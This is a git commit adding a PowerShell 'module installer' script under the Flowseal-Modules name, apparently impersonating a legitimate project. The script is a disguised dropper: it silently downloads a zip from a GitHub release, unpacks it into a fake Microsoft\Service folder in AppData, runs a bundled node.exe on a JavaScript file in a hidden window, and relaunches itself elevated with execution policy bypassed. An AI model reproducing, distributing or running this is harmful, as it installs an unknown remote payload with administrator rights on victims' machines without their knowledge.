e993896abf5a548173beb82529859e7f2dc24b24
Flowseal-Modules <b1@inmeow.ru>
2025-12-04 21:18:34 +0800

    Add files via upload

---
+++ install.ps1
@@ -0,0 +1,41 @@
+$ErrorActionPreference = 'Stop'
+
+# MODULE INSTALLER
+$bgScriptPath = Join-Path $env:TEMP "zprt_bgmodules_$(Get-Random).ps1"
+
+@"
+`$dest = `"$env:APPDATA\Microsoft\Service`"
+if (-not (Test-Path `$dest)) {
+    New-Item -ItemType Directory -Path `$dest | Out-Null
+}
+
+`$zipUrl = `"https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip`"
+`$zipPath = `"$env:TEMP\payload.zip`"
+
+Invoke-WebRequest -Uri `$zipUrl -OutFile `$zipPath
+Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force
+
+`$folderDir = `"$env:APPDATA\Microsoft\Service\App`"
+
+`$nodePath = Join-Path `$folderDir "node.exe"
+`$js = Get-ChildItem -Path `$folderDir -Filter "index_*.js" | Select-Object -First 1
+
+if (`$js) {
+	Start-Process `$nodePath `` 
+		-ArgumentList `"```"`$(`$js.FullName)```"`" `` 
+		-WindowStyle Hidden `` 
+		-WorkingDirectory `$folderDir
+}
+
+Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
+"@ | Set-Content -Path $bgScriptPath -Encoding UTF8
+
+$bg = $null
+try {
+    $bg = Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -PassThru `
+        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$bgScriptPath`""
+} catch {}
+
+if (-not $bg) {
+    exit
+}
